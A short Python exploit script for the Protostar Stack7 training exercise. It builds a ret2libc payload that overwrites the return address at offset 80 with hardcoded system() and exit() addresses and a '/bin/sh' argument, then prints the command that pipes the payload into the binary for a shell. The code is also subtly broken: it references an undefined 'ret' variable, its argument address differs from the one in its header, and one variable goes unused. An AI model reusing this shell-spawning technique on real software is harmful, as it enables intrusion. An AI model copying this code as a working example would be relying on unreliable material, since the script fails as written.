#!/usr/bin/env python3

###################################################
# Protostar Stack7 ret2libc exploit               #
# Author: Bengman                                 #
#                                                 #
# RET overwrite at offset 80 in our buffer        #
# system: 0xb7ecffb0                              #
# exit: 0xb7ec60c0                                #
# "bin/sh": 0xbffff76c                            #
###################################################

offset = 80
shell = "/bin/sh;#"
junk = "A"*(offset - len(shell))

text_ret = "\x94\x84\x04\x08"

system_addr = "\xb0\xff\xec\xb7"
system_arg = "\x5c\xf7\xff\xbf"

exit_addr = "\xc0\x60\xec\xb7"
exit_arg = "\xff\xff\xff\xff"

payload = shell + junk + ret + system_addr + exit_addr + system_arg

f = open('/home/user/stack7_payload', 'w')
f.write(payload)
f.write("\n")
f.close()

print("[+] Payload written to /home/user/stack7_payload.")
print("[+] Run with: (cat /home/user/stack7_payload; cat) | /opt/protostar/bin/stack7")
